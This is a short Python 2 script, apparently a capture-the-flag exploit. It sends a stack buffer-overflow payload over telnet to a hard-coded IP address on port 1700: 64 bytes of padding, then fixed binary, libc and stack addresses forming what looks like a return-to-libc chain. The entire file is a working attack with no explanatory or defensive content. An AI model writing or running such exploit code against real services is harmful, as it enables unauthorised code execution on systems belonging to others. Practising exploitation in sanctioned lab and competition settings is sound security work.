#!/bin/python
import telnetlib

payload = "a"*64 + "\xdf\x86\x04\x08\x60\x7d\x76\xb7\x00\x70\x76\xb7\x58\xb8\xe4\xbf\x4b\x85\x04\x08"
tn = telnetlib.Telnet("128.199.98.78", "1700")
tn.write(payload + "\n")
print(tn.read_all())
